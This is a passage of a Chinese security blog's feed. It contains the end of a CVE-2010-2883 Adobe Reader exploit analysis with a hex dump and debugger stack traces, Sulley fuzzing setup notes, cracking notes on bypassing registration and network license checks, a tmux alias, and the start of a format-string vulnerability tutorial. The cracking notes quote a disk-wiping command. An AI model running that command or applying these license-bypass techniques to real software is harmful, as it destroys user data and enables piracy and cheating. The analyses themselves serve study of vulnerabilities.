24 4B 52 2D CF B6 FE C2 70 D1 4F 19 F7 0A A1 80 3D 6C CB 98 71 63 B7 BA 7F CF 86 DE A8 5F 1B D6
80 30 E0 DA F7 CF 88 4A AD 6A B9 EB E2 67 E6 61 B9 AA 30 0B 60 2C 5E 4E 3D 69 5E 3B 07 AB 07 20
9E 6E 2C 40 50 C8 88 B8 E4 E7 3A 14 A1 CF D9 92 C6 08 8A 4A 4D C7 C9 5C 2E 98 3C A5 07 99 1B 15
52 5D B5 CD 55 10 10 1A 9C 83 3F B0 59 1B 3C 34 EA C3 3C 55 BA FC 1E A3 D0 C2 5D 69 FB DF 80 E6
B8 94 01 BF AF A1 60 09 E3 F4 1F 20 21 3C 25 D5 21 BE C0 11 4C 0D C0 85 F4 CF 3E 04 03 3E BB 05
C6 83 27 D2 97 1C BA 77 36 25 58 3D 1F A5 10 92 0E 28 5A E8 39 21 66 17 C3 85 AD E2 5E 6C F8 C9
B1 F4 C7 40 65 95 DD 5F 38 C6 E3 AF 53 F4 E6 AB C0 3B 93 BC 0D 3C 8E E7 8C 5C 10 E7 7F C0 CB D1
5F 5D 2F 48 29 CD F5 06 F0 BA EF 74 0A AC FD C6 3F 30 AA 6F 8F 9E CD 35 79 6B 4F 6C C5 BF A8 80
BA 3D BE 39 1A 71 D2 2A EC 15 02 08 96 42 9A 9F EB 73 B3 65 09 2A E1 6E 38 CB 80 4A 0E 53 52 42
D4 DB EA 3B E2 A6 42 81 B1 B9 15 31 EB B1 37 EB 7F 80 18 16 A9 C5 4F EF 64 D2 5E 82 72 57 2A 1A
66 42 3A 18 98 E0 69 D7 85 66 82 66 C1 79 A3 A7 D1 18 93 1C 4F CB B6 97 B4 5C 11 98 6C
-------------end--------------
共0x23c=572个字节
5.具体od截图如下
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/cve-2010-2883-1.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;5.f8,f8,f8到803dda7处时eax=12e4b0,也即strcat的目标地址(第一个参数)
(堆栈窗口中)
------------12e4b0-------------
0012E4B0   0012E400
0012E4B4   0012E688
0012E4B8   00000000
0012E4BC   91E717D0
0012E4C0   0012E830
0012E4C4   0823AE9C  CoolType.0823AE9C
0012E4C8   080852EF  返回到 CoolType.080852EF 来自 CoolType.0804818F
0012E4CC   0823A650  CoolType.0823A650
0012E4D0   044498BC
0012E4D4   08080D0B  CoolType.08080D0B
0012E4D8   046B1C1C
0012E4DC   0012E4AC
0012E4E0   0012E528
0012E4E4   0136F8AF  AcroRd_1.0136F8AF
0012E4E8   FFFFFFFF
0012E4EC   010CB9DC  返回到 AcroRd_1.010CB9DC 来自 AcroRd_1.00BB1899
0012E4F0   011BA90A  返回到 AcroRd_1.011BA90A
0012E4F4   0012E55C
0012E4F8   0012E56C
0012E4FC   0012E558
0012E500  /0012E554
0012E504  |011BA949  返回到 AcroRd_1.011BA949 来自 AcroRd_1.00BB1899
0012E508  |91E71706
0012E50C  |00000004
0012E510  |0012E688
0012E514  |00000000
0012E518  |0012E518
0012E51C  |011BA90A  返回到 AcroRd_1.011BA90A
0012E520  |0012E588
0012E524  |0012E598

-------------end---------------
6.0x12e4b0+0x23c=0x12e6ec
易知12e4c8处首先被覆盖成03a9dc3f(4中第七个栈单元的内容)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 28 Jul 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/07/28/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2883/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/07/28/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2883/</guid>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        <category>adobe reader</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>quick start sulley</title>
        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;0.&lt;/span&gt;sulley api doc
    http://www.fuzzing.org/wp-content/SulleyEpyDoc/private/sulley-module.html
&lt;span class=&quot;p&quot;&gt;
1.&lt;/span&gt;a good vedio on youtube about basic fuzz knowledge:
    https://www.youtube.com/watch?v=q0Bg2PBxXNA
    or
    http://www.dfate.de/public/index.php
  four file linked to upon vedio:
    https://github.com/StefanMolls/Blog-related-Files/tree/master/Video1-Fuzzing%20Basics%20with%20Sulley%20
    include these:
        crashbin_explorer.py(crashbin_explorer.py create a app_relevant_cases.txt,this crashbin_explorer.py is different from the origin utils&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;rashbin_explorer.py)
        filter_cases.py
        pcmanftp.py
        pcmanftp_simple.py
&lt;span class=&quot;p&quot;&gt;        
2.&lt;/span&gt;a very good script to install sulley quickly from the same vedio author like upon
    https://github.com/reider-roque/sulley-win-installer
&lt;span class=&quot;p&quot;&gt;
3.&lt;/span&gt;chinese sulley doc translation from pediy
    http://bbs.pediy.com/archive/index.php?t-135764.html
&lt;span class=&quot;p&quot;&gt;
4.&lt;/span&gt;defcon23 a vedio about fuzz,about wadi
    https://www.youtube.com/watch?v=jnBhb6DiP2k
&lt;span class=&quot;p&quot;&gt;
5.&lt;/span&gt;example
&lt;span class=&quot;p&quot;&gt;    192.&lt;/span&gt;168.3.77(fuzzer machine,installed sulley)
&lt;span class=&quot;p&quot;&gt;    192.&lt;/span&gt;168.3.177(been fuzzed machine with pcmanftpd2.exe,installed sulley)
    
    on 192.168.3.177&#39;s sulley root directory:
        process_monitor.py -c audit&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;cmanftpd_crashbin -p &quot;PCManFTPD2.exe&quot;&lt;span class=&quot;sb&quot;&gt;

    on 192.168.3.77&#39;s sulley root directory:
        copy https://github.com/xinghuacai/mysulleycases/crashbin_explorer.py .
        copy https://github.com/xinghuacai/mysulleycases/filter_cases.py .
        copy https://github.com/xinghuacai/mysulleycases/pcmanftpd2.py .
        network_monitor.py -d 0 -f &quot;src or dst port 21&quot; -P audit
        pcmanftpd2.py(run twice)
            select debug mode first(generate a pcman_all_cases.txt)
            select not debug mode second(start the real fuzz)

    running fuzz...
    finished fuzz

    on 192.168.3.77&#39;s sulley root directory:
        copy 192.168.3.177\sulley\audit\pcmanftpd_crashbin .
        crashbin_explorer.py(generage a pcman_relevant_cases.txt,and show the numbers of the crashed ones)
            crashbin_explorer.py -t num(this command can show the detail of the num crash,this command is not necessary)
        utils\pcap_cleaner.py pcmanftpd_crashbin audit(delete the useless .pcap files in audit)
        filter_cases.py(generate pcman_relevant.txt from pcman_all_cases.txt and pcman_relevant_cases.txt)

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;important files about sulley can be download from:
    https://github.com/3xp10it/mysulleycases
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 28 Jul 2016 00:00:00 +0800</pubDate>
        <link>/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/2016/07/28/quick-start-sulley/</link>
        <guid isPermaLink="true">/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/2016/07/28/quick-start-sulley/</guid>
        
        <category>sulley</category>
        
        
        <category>漏洞挖掘</category>
        
      </item>
    
      <item>
        <title>小生我怕怕笔记</title>
        <description>&lt;h3 id=&quot;x01-12&quot;&gt;0x01 破解技巧1&lt;小生我怕怕第2课&gt;&lt;/小生我怕怕第2课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;右键同时查找文本并复制多个&quot;未注册/注册&quot;关键字附近的汇编代码到文本文件,比较它们,找出关键的与未注册相关的call调用、cmp处的相关比较(快速找出关键call)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-23&quot;&gt;0x02 破解技巧2&lt;小生我怕怕第3课&gt;&lt;/小生我怕怕第3课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;se和vm的壳有反调试功能,调试方法:
     ctrl+f2后shift+f9
2&amp;gt;各语言入口特征及按钮事件查找方法:
1&amp;gt;&amp;gt;c++
         c++字符串查找:ascii
         c++按钮事件查找:sub eax,0A
         c++入口函数GetVersion

c++的入口
00408027 &amp;gt;/$  55             push ebp
00408028  |.  8BEC           mov ebp,esp
0040802A  |.  6A FF          push -0x1
0040802C  |.  68 F0F14000    push C++.0040F1F0
00408031  |.  68 84AF4000    push C++.0040AF84                        ;  SE 处理程序安装
00408036  |.  64:A1 00000000 mov eax,dword ptr fs:[0]
0040803C  |.  50             push eax
0040803D  |.  64:8925 000000&amp;gt;mov dword ptr fs:[0],esp
00408044  |.  83EC 58        sub esp,0x58
00408047  |.  53             push ebx
00408048  |.  56             push esi
00408049  |.  57             push edi                                 ;  ntdll.7C930228
0040804A  |.  8965 E8        mov [local.6],esp
0040804D  |.  FF15 E4F04000  call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetVersion&amp;gt;;

2&amp;gt;&amp;gt;delphin
         delphin字符串查找:ascii
         delphin按钮事件查找:右键-查找-查找二进制字符串:
             740E8BD38B83????????FF93????????
         ctrl+l键下翻页查找,每个都下断

delphin的入口
0045D408 &amp;gt; $  55             push ebp
0045D409   .  8BEC           mov ebp,esp
0045D40B   .  83C4 F0        add esp,-0x10
0045D40E   .  B8 28D24500    mov eax,DELPHI.0045D228
0045D413   .  E8 6088FAFF    call DELPHI.00405C78

3&amp;gt;&amp;gt;汇编
         汇编字符串查找:ascii
         汇编入口函数:GetModuleHandleA

汇编的入口
0040285E &amp;gt;/$  6A 00          push 0x0                                 ; /pModule = NULL
00402860  |.  E8 970B0000    call &amp;lt;jmp.&amp;amp;kernel32.GetModuleHandleA&amp;gt;    ; \GetModuleHandleA

4&amp;gt;&amp;gt;易语言
         易语言字符串查找:ascii
         易语言按钮事件(查找二进制代码):FF 55 FC 5F 5E
         易语言入口函数:GetVersion
         停留下后,alt+f9---&amp;gt;查找二进制字符串:
              FC DB E3 E8 ?? ?? ?? ??
         多数易语言采用花指令对易格式体进行保护,可先采用E junk code处理掉再查找ascii字符串
         

5&amp;gt;&amp;gt;vc8
         vc8字符串查找:unicode
         vc8按钮事件查找:sub eax 0A
         vc8入口函数:GetStartupInfoW

v8的入口
00403A30 &amp;gt; $  E8 6E270000   call VC8.004061A3
00403A35   .^ E9 79FEFFFF   jmp VC8.004038B3
00403A3A  /$  55            push ebp
00403A3B  |.  8BEC          mov ebp,esp
00403A3D  |.  83EC 08       sub esp,0x8

6&amp;gt;&amp;gt;vb
         vb字符串查找:unicode
         vb 查找字符串时采用二进制字符串816C2404??000000
         vb入口特征查找函数:ThunRTMain
         注:识别VB P-code编译时,只需要查找不到按钮事件就是P-CODE编译
               P-CODE代码是虚拟代码,需要独立的调试器
         vb的入口
00401978   .- FF25 18114000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#613&amp;gt;]      ;  msvbvm60.rtcVarStrFromVar
0040197E   .- FF25 84104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.__vbaVarTst&amp;gt;;  msvbvm60.__vbaVarTstEq
00401984   .- FF25 7C104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#528&amp;gt;]      ;  msvbvm60.rtcUpperCaseVar
0040198A   .- FF25 A8104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_QueryInterface
00401990   .- FF25 78104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_AddRef
00401996   .- FF25 9C104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_Release
0040199C   $- FF25 08114000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#100&amp;gt;]      ;  msvbvm60.ThunRTMain
004019A2      00            db 00
004019A3      00            db 00
004019A4 &amp;gt; $  68 5C284000   push VB.0040285C                         ;  ASCII &quot;VB5!6&amp;amp;vb6chs.dll&quot;
004019A9   .  E8 EEFFFFFF   call &amp;lt;jmp.&amp;amp;MSVBVM60.#100&amp;gt;

3&amp;gt;die64
DIE64类似于PEID的功能,但是他强大之处,在于他可以不管是任何壳保护的情况下,都可以识别出他的编写语言

4&amp;gt;vmp
     VMP入口,就是看起来很凌乱,就像未解码的代码一样,但是VMP保护分两种代码
乱序
虚拟

VMP在默认保护的情况下是不会保护功能代码的,并且VMP保护功能代码只是一个区段,如果大家看到的.VMP区段有三条的话,就表示此程序已经被VMP进行了最大保护,如果只是一条区段的话,那就是乱序保护,两条区段的话,就是乱序加虚拟保护

5&amp;gt;tmd
TMD2.10以后的版本和WL的版本入口都是一样

00600000 &amp;gt;  83EC 04         sub esp,0x4
00600003    50              push eax
00600004    53              push ebx
00600005    E8 01000000     call 易语言.0060000B
0060000A    CC              int3
0060000B    58              pop eax                                  ; kernel32.7C817027
0060000C    89C3            mov ebx,eax
0060000E    40              inc eax

6&amp;gt;个人推荐这个保护自己的补丁Private exe Protector
7&amp;gt;SE调试技巧,就是在运行起来之后4-5分钟时在去调试,可以避免少被ANTI到,ANTI所指的是反调试
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-34&quot;&gt;0x03 破解技巧3&lt;小生我怕怕第4课&gt;&lt;/小生我怕怕第4课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;回溯的方法
(a.并非所有程序的破解都可以用b.该方法可用于没有字符串可以查找的情况)

1&amp;gt;&amp;gt;随意输入用户名+注册码后程序弹出对话框显示注册失败
2&amp;gt;&amp;gt;f12暂停程序
3&amp;gt;&amp;gt;alt+f9执行到用户代码
4&amp;gt;&amp;gt;点击对话框中的确定
5&amp;gt;&amp;gt;在当前程序领空中的eip附近找到jne,je或其他关键跳转进行修改

2&amp;gt;按钮事件下断点的方法
(a.脚本下断点:http://pan.baidu.com/s/1pLAeaL1中的ollyscript脚本b.自己通过破解技巧2中的按钮事件二进制字符串下断)
1&amp;gt;&amp;gt;下按钮事件断点,ab两种方法
2&amp;gt;&amp;gt;随意输入用户名+注册码后点击确定注册,程序中断
3&amp;gt;&amp;gt;在堆栈窗口中往下查找输入的用户名注册码等字符串
4&amp;gt;&amp;gt;在堆栈窗口中3中找到的字符串的上面的最近几处的&quot;返回到...&quot;处右键在汇编窗口中显示,找出关键call
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-45&quot;&gt;0x04 破解技巧4&lt;小生我怕怕第5课&gt;&lt;/小生我怕怕第5课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;在破解中合适地运用&quot;所有常量&quot;和&quot;所有命令&quot;会使破解轻松很多
2&amp;gt;vb和delphin中的&quot;所有常量&quot;几乎对破解没有帮助
3&amp;gt;vb破解时
1&amp;gt;&amp;gt;右键查找所有模块调用---&amp;gt;在所有rtcMsgBox下断
2&amp;gt;&amp;gt;任意输入用户名和注册码,单击确定注册
3&amp;gt;&amp;gt;排除明显不是关键断点的rtcMsgBox断点
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-56&quot;&gt;0x05 破解技巧5&lt;小生我怕怕第6课&gt;&lt;/小生我怕怕第6课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;vb多采用0xffff做比较,判断是否是正式版
2&amp;gt;vb破解时,可在__vbaStrCmp的所有调用处下断
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x06-67&quot;&gt;0x06 破解技巧6&lt;小生我怕怕第7课&gt;&lt;/小生我怕怕第7课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; bc++的按钮事件和delphin是一样的
2&amp;gt;重启验证必须在程序还未完全初始化时,找到重启后的关键地址,进行破解
3&amp;gt;一般破解的关键跳转(je,jne)处会涉及到eax
4&amp;gt;一般与注册表有关时,RegCloseKey以下为关键验证的地方,结合3找出关键跳转,进行破解
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x07-79&quot;&gt;0x07 破解技巧7&lt;小生我怕怕第9课&gt;&lt;/小生我怕怕第9课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;一般破解的关键在eax
2&amp;gt;vb的程序,一般以-1(FFFF)和1进行比较
3&amp;gt;破解采用api下断的方法时,在api上下的断点是针对系统领域下的,需要alt+f9运行到用户代码方可继续进行调试
4&amp;gt;od死码
1&amp;gt;&amp;gt;什么是OD死码?
OD死码指的就是OD反汇编中游戏更新后也不变的汇编.
eg:
8D 3C 24 ??????????????8D 75 08 8B 1E 83 C6 04 51

每两个问号代表一个字节,我们也可以通过问号去代表会改变的数值,也可以通过问号去代表着寄存器换算的数值,只需要前后左右,照顾周全就OK,PUSH 是不会改变的,但是他也会因为PUSH的值不同而有所改变,所以,我们要根据实际的情况

2&amp;gt;&amp;gt;如何设立?
规则:最多8条汇编,因为OD里ctrl+s搜的时候最多只能8条
哪些汇编不能用于OD死码:call 内存地址
jz/jnz/je(等跳转语句) 内存地址
mov eax,[ecx+0abc] 偏移abc比较大的不可以.
mov eax,[esp+30] 汇编里有ESP堆栈寄存器的不可以,后面跟的偏移+30会变化

3&amp;gt;&amp;gt;为什么要设立?
因为游戏更新基址,较大的偏移会变化,为了方便,所以设立OD死码,方便快速获取游戏更新后的相关数据.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x08-810&quot;&gt;0x08 破解技巧8&lt;小生我怕怕第10课&gt;&lt;/小生我怕怕第10课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;一个程序脱壳以后不要直接运行它,要是有校验格盘那么就受伤了,可以查找字符串或在虚拟机中运行
2&amp;gt;易语言窗体事件
004156A5   .  68 02000080   push 0x80000002
004156AA   .  6A 00         push 0x0
004156AC   .  68 00000000   push 0x0
004156B1   .  6A 00         push 0x0
004156B3   .  6A 00         push 0x0
004156B5   .  6A 00         push 0x0
004156B7   .  68 01000100   push 0x10001
004156BC   .  FF35 D4744C00 push dword ptr ds:[0x4C74D4]
004156C2   .  FF35 D0744C00 push dword ptr ds:[0x4C74D0]
004156C8   .  68 03000000   push 0x3
004156CD   .  BB D09E4100   mov ebx,六开挤线.00419ED0
004156D2   .  E8 87420000   call 六开挤线.0041995E
004156D7   .  83C4 28       add esp,0x28
004156DA   .  6A 00         push 0x0
004156DC   .  68 02000000   push 0x2
004156E1   .  6A FF         push -0x1
004156E3   .  6A 12         push 0x12
004156E5   .  68 E6A90206   push 0x602A9E6
004156EA   .  68 7F9F0252   push 0x52029F7F
004156EF   .  E8 76420000   call 六开挤线.0041996A
004156F4   .  83C4 18       add esp,0x18
004156F7   .  6A 00         push 0x0
004156F9   .  68 00000000   push 0x0
004156FE   .  6A FF         push -0x1
00415700   .  6A 05         push 0x5
00415702   .  68 E6A90206   push 0x602A9E6
00415707   .  68 7F9F0252   push 0x52029F7F
0041570C   .  E8 59420000   call 六开挤线.0041996A
00415711   .  83C4 18       add esp,0x18
00415714   .  E8 0B79FFFF   call 六开挤线.0040D024
00415719   .  E8 C594FFFF   call 六开挤线.0040EBE3

004156DA   .  6A 00         push 0x0
004156DC   .  68 02000000   push 0x2
004156E1   .  6A FF         push -0x1
004156E3   .  6A 12         push 0x12
004156E5   .  68 E6A90206   push 0x602A9E6
004156EA   .  68 7F9F0252   push 0x52029F7F
004156EF   .  E8 76420000   call 六开挤线.0041996A
004156F4   .  83C4 18       add esp,0x18

这样的代码我们叫他为窗体事件,只要鼓捣过易语言老版本的人都比较清楚

只要能锁定到窗体事件,完全就可以来一个超级大跳转

3&amp;gt;常见网络验证
首先我们按强度排列
第一的当然是
可可验证
绝大多数运用在DNF外挂上面

飘零网络验证

飘零的早期版本,是可以山寨到管理端的

CC网络验证

相对来说,较为简单,但是作者也颇贱,原版CC就带有格盘代码

小烦的网络验证

更为简单,有数据库漏洞

当我们辨别出是那一款比较常见的网络验证之时,可以常试先找一份无壳版的跟一下,然后在套用思路即可

4&amp;gt;易语言的远跳转以及易语言的JE JNZ是非常需要关注的
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x09-911-19&quot;&gt;0x09 破解技巧9&amp;lt;11-19课&amp;gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;小生我怕怕第11课:
     易原体讲解
小生我怕怕第12课:
     delphin网络验证
     格盘命令:cmd.exe /c del /f /s /q /a c:\*.*
小生我怕怕第13课:
     c的网络验证(c++外挂破解)
小生我怕怕第14课:
     讲解如何去除和锁定网络验证暗装

     当我们破解了程序发现没有功能,那么就是暗装导致的
     当我们破解程序突然间关机,那么就是暗装导致的
     当我们破解程序突然被格盘,那么就是暗装导致的
     当我们破解时,出现暗装那么是系统错误或者内存错误,都有可能,但是也并不是绝对
     部分程序他是由各自系统不兼容所导致,所以在选择破解程序时遇见暗装可以给多几个人测试是否正常

小生我怕怕第15课:
     剖析网络验证的机制

小生我怕怕第16课:
     快速锁定功能项进行爆破,从而达到跳过网络机制

     当我们破解程序限制时,可以借助彗星小助手和XT去查找他是否有多窗体,如果有多窗体,我们可以通过这两个工具去穿透第一层验证窗体,去第二层,实施功能爆破

小生我怕怕第17课:
     认识本地网络验证的几种方法

     本地验证也就是将远程服务器的IP地址转换成127.0.0.1
     然后在本地根据服务器端口进行模拟,一个本地的验证端

     通常可以本地验证的程序是属于封包固定型态
     或者就是你能理解他的算法加密
     又或者是你能固定他的加密密钥

     还有一种方法的本地验证就是,需要你能弄到验证文件,然后在自己的机器或者服务器上架设

     RECV就是接收封包
     SEND 就是发送封包

     修改HOST型
     修改HOST表的方法千万不能运用在ASP型文件验证上,会被检测
     好处:简便,任何机器都可以使用
     坏处:薄弱,容易被检测

     更改IP型
     好处:简单,方便,没有什么技术性可言
     坏处:路由器,网吧都不可以使用
     注:路由器如果想使用此方法,可以使用泡泡鱼虚拟网卡进行修改

     网截拦截型
     好处:就是简单易用,列子比较多,并且他是全局注入型,可以拦截大部分程序
     坏处:被很多程序在启动之时,都会检测我们的C盘是否存在网截的DLL
     注:存放于C:\WINDOWS\system32

     HOOK型
     好处:强大易用,复杂,需要很好的编程基础
     坏处:一般人学不会,需要很多时间去学习

     免费模块型
     好处:没有基础也可以使用,但是相对来说比上面的HOOK型要为简便些
     坏处:不是太稳定,因为此模块只是早期的版本,可以使用超级模块5.0进行替换
     注:超级模块口碑不是太好,使用时小心

     收费模块型
     好处:稳定,拦截准趣,有BUG有人修复
     坏处:时不时不兼容,部分机器也出现拦截不下的现象

小生我怕怕第18课:
     解密网络验证之数据加密

小生我怕怕第19课:
     剖析网络验证之绑号风格
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 27 Jul 2016 00:00:00 +0800</pubDate>
        <link>/tmux/2016/07/27/%E5%B0%8F%E7%94%9F%E6%88%91%E6%80%95%E6%80%95%E7%A0%B4%E8%A7%A3%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">/tmux/2016/07/27/%E5%B0%8F%E7%94%9F%E6%88%91%E6%80%95%E6%80%95%E7%A0%B4%E8%A7%A3%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</guid>
        
        <category>破解</category>
        
        <category>逆向</category>
        
        
        <category>tmux</category>
        
      </item>
    
      <item>
        <title>tmux自动布局</title>
        <description>&lt;p&gt;将下面复制到.zshrc中&lt;/p&gt;

&lt;p&gt;uptate 2016-07-30:
```
»&amp;gt;add ranger&lt;/p&gt;

&lt;p&gt;alias od=”tmux splitw -h -p 38;tmux splitw -v -p 30;tmux selectp -L;tmux splitw -v -p 30;tmux selectp -U;ranger”
```&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;快捷命令od可进入设定的layout
其他相关命令

tmux selectp -R    #选择右边的面板
tmux selectp -D    #选择下面的面板
tmux selectp -L    #选择左边的面板
tmux selectp -U    #选择上面的面板

下面4个根据man tmux利用
tmux setw main-pane-height 25
tmux setw main-pane-width 75
tmux select-layout main-horizontal    
tmux select-layout main-vertical

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 27 Jul 2016 00:00:00 +0800</pubDate>
        <link>/tmux/2016/07/27/tmux%E8%87%AA%E5%8A%A8%E5%B8%83%E5%B1%80/</link>
        <guid isPermaLink="true">/tmux/2016/07/27/tmux%E8%87%AA%E5%8A%A8%E5%B8%83%E5%B1%80/</guid>
        
        <category>tmux</category>
        
        
        <category>tmux</category>
        
      </item>
    
      <item>
        <title>格式化串漏洞</title>
        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 结论知识&lt;/h3&gt;

&lt;p&gt;1&amp;gt;printf(“%x”)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%x&quot;):未进入printf函数前,第一个栈里的值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2&amp;gt;printf(“%8x”)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%8x&quot;):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$x&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%3\$x&quot;):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$n&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;AAAA%3\$n&quot;):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 原理理解&lt;/h3&gt;

&lt;h4 id=&quot;refer&quot;&gt;1&amp;gt;refer&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/binary/7714
http://drops.wooyun.org/papers/9426
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;c&quot;&gt;2&amp;gt;c代码&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;假设文件名为md.c
------------md.c----------------
#include &amp;lt;stdio.h&amp;gt;
int main(void)
{ 
    int flag = 0;
    int *p = &amp;amp;flag; 
    char a[100];
    scanf(&quot;%s&quot;,a);
    printf(a);

    if(flag == 2000)
    {
        printf(&quot;good!!\n&quot;);
    }

    return 0;
}
-------------end----------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;3&amp;gt;栈空间&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cplusplus.com/reference/cstdio/printf/&quot;&gt;printf函数&lt;/a&gt;&lt;br /&gt;
int printf ( const char * format, …  )&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨

